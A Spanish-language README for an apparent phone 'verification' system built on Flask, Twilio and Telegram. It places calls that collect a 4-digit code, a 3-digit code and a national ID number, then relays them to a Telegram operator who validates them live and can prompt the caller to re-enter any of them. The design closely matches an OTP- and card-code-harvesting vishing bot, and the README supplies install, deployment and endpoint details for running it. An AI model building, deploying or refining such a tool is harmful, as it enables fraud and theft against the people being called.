# Sistema de Verificación Telefónica

Este proyecto es un sistema de verificación telefónica basado en Flask que se integra con Twilio para la gestión de llamadas y Telegram para la verificación por parte de administradores. El sistema guía a los usuarios a través de un proceso de verificación, recopilando códigos y números de identificación, que luego pueden ser validados por un administrador a través de Telegram.

## 📋 Tabla de Contenidos

- [Características](#características)
- [Requisitos Previos](#requisitos-previos)
- [Instalación](#instalación)
- [Configuración](#configuración)
- [Despliegue](#despliegue)
- [Endpoints de la API](#endpoints-de-la-api)
- [Flujo de Llamadas](#flujo-de-llamadas)
- [Integración con Bot de Telegram](#integración-con-bot-de-telegram)
- [Gestión de Sesiones](#gestión-de-sesiones)
- [Sistema de Registro (Logging)](#sistema-de-registro-logging)
- [Solución de Problemas](#solución-de-problemas)

## 🌟 Características

- Proceso automatizado de verificación telefónica usando Twilio
- Verificación en múltiples pasos (código de 4 dígitos, código de 3 dígitos y número de cédula)
- Validación en tiempo real por parte de administradores a través de Telegram
- Persistencia de sesiones entre reinicios del servidor
- Sistema de registro detallado
- Respuesta de voz interactiva con mensajes en español

## 🛠️ Requisitos Previos

- Python 3.6+
- Cuenta de Twilio con número de teléfono
- Bot de Telegram configurado
- ngrok (para desarrollo local)

## 📥 Instalación

1. Clona el repositorio:
   ```bash
   git clone https://github.com/tuusuario/sistema-verificacion-telefonica.git
   cd sistema-verificacion-telefonica
   ```

2. Crea un entorno virtual:
   ```bash
   python -m venv venv
   source venv/bin/activate  # En Windows: venv\Scripts\activate
   ```

3. Instala las dependencias:
   ```bash
   pip install flask twilio requests
   ```

## ⚙️ Configuración

Edita las variables de configuración en el código:

```python
# ⚙️ Configuración
TWILIO_ACCOUNT_SID = 'Tu_Account_SID'
TWILIO_AUTH_TOKEN = 'Tu_Auth_Token'
TWILIO_PHONE_NUMBER = 'Tu_Numero_Twilio'
YOUR_PHONE_NUMBER = 'Tu_Numero_Telefono'

TELEGRAM_BOT_TOKEN = 'Tu_Token_Bot_Telegram'
TELEGRAM_CHAT_ID = 'Tu_Chat_ID'
```

## 🚀 Despliegue

### Despliegue Local con ngrok

1. Inicia el servidor Flask:
   ```bash
   python app.py
   ```

2. Abre otra terminal y lanza ngrok:
   ```bash
   ngrok http 5000
   ```

3. Copia la URL HTTPS generada por ngrok

4. Configura la URL de webhook en tu cuenta de Twilio:
   - Ve al panel de control de Twilio
   - Configura el webhook para llamadas entrantes con la URL de ngrok seguida de `/step1`
   - Ejemplo: `https://tu-url-ngrok.io/step1`

### Despliegue en Servidor

1. Configura un servidor con Python (por ejemplo, usando Gunicorn):
   ```bash
   pip install gunicorn
   gunicorn app:app
   ```

2. Configura un proxy inverso como Nginx para exponer el servicio

3. Asegúrate de actualizar la URL del webhook de Twilio con tu dominio público

## 🔄 Endpoints de la API

| Ruta | Método | Descripción |
|------|--------|-------------|
| `/` | GET | Página principal |
| `/make-call` | GET | Inicia una nueva llamada al número configurado |
| `/step1` | POST, GET | Solicita el código de verificación de 4 dígitos |
| `/save-step1` | POST | Guarda el código de 4 dígitos |
| `/step2` | POST, GET | Solicita el código de verificación de 3 dígitos |
| `/save-step2` | POST | Guarda el código de 3 dígitos |
| `/step3` | POST, GET | Solicita el número de cédula |
| `/save-step3` | POST | Guarda el número de cédula y envía notificación a Telegram |
| `/waiting-validation` | POST, GET | Ruta de espera mientras se validan los datos |
| `/validate-result` | GET, POST | Verifica el resultado de la validación |
| `/revalidate/<data_type>` | POST, GET | Permite revalidar un tipo específico de dato |
| `/reverify` | POST, GET | Solicita una nueva verificación de todos los datos |
| `/verify-with-timeout` | POST, GET | Permite especificar un tiempo personalizado para espera |
| `/manual-validar` | GET | Validación manual vía web |
| `/validar` | POST, GET | Procesa la validación recibida desde Telegram |
| `/start-polling` | GET | Inicia el polling de Telegram |
| `/stop-polling` | GET | Detiene el polling de Telegram |
| `/polling-status` | GET | Muestra el estado del polling de Telegram |
| `/sessions` | GET | Muestra todas las sesiones activas |
| `/clear-sessions` | GET | Limpia todas las sesiones |

## 📞 Flujo de Llamadas

1. El sistema inicia una llamada al usuario (`/make-call`)
2. El usuario escucha instrucciones para ingresar el código de 4 dígitos (`/step1`)
3. Después de ingresar el código, se solicita un segundo código de 3 dígitos (`/step2`)
4. Finalmente, se solicita el número de cédula de 10 dígitos (`/step3`)
5. Los datos se envían al administrador a través de Telegram
6. El sistema espera la validación del administrador (`/waiting-validation`)
7. El administrador valida los datos a través de Telegram con el comando `/validar`
8. El sistema procesa la respuesta y comunica el resultado al usuario (`/validate-result`)

## 🤖 Integración con Bot de Telegram

El sistema utiliza un bot de Telegram para:

- Enviar notificaciones al administrador con los datos recopilados
- Recibir comandos de validación del administrador
- Permitir al administrador aprobar o rechazar cada parte de la verificación

**Comandos del Bot:**
- `/validar <call_sid> 1 1 1` - Valida todos los datos como correctos
- `/validar <call_sid> 1 0 1` - Indica que el segundo código es incorrecto

## 💾 Gestión de Sesiones

El sistema mantiene un registro de todas las sesiones activas en un diccionario global `global_user_sessions` y lo guarda en un archivo JSON para persistencia entre reinicios del servidor.

Cada sesión contiene:
- `code4`: Código de 4 dígitos
- `code3`: Código de 3 dígitos
- `cedula`: Número de cédula
- `validacion`: Estado de validación [code4_valid, code3_valid, cedula_valid]

## 📝 Sistema de Registro (Logging)

El sistema implementa un registro detallado que:
- Guarda información en la consola
- Mantiene archivos de registro diarios en la carpeta `/logs`
- Registra todas las operaciones importantes con marcas de tiempo
- Utiliza emojis para facilitar la identificación de tipos de mensajes

## ❓ Solución de Problemas

### Problemas comunes:

1. **No hay respuesta de Twilio:**
   - Verifica que la URL de webhook esté correctamente configurada
   - Comprueba que ngrok esté funcionando correctamente

2. **El bot de Telegram no responde:**
   - Verifica que el polling de Telegram esté activo (`/polling-status`)
   - Reinicia el polling con `/start-polling`

3. **Problemas de validación:**
   - Verifica las sesiones activas con `/sessions`
   - Limpia las sesiones con `/clear-sessions` si es necesario

4. **La llamada se corta:**
   - Verifica los tiempos de espera en las rutas de validación
   - Aumenta los tiempos de espera en `/verify-with-timeout`

5. **Errores de conexión:**
   - Verifica la configuración de Twilio y Telegram
   - Revisa los logs en la carpeta `/logs`

## 🔍 Estructura del Código

El código está organizado de la siguiente manera:

- **Configuración inicial**: Configuración de logging, credenciales y variables globales
- **Rutas principales**: Endpoints para manejar el flujo de llamadas
- **Funciones de validación**: Lógica para procesar las validaciones
- **Integración con Telegram**: Funciones para comunicación con el bot de Telegram
- **Gestión de sesiones**: Funciones para persistencia de datos
- **Utilidades**: Funciones auxiliares para el funcionamiento del sistema

## 📊 Mantenimiento

Para mantener el sistema funcionando correctamente:

1. Revisa regularmente los archivos de log
2. Limpia periódicamente las sesiones antiguas
3. Verifica el estado del polling de Telegram
4. Actualiza las credenciales de Twilio y Telegram según sea necesario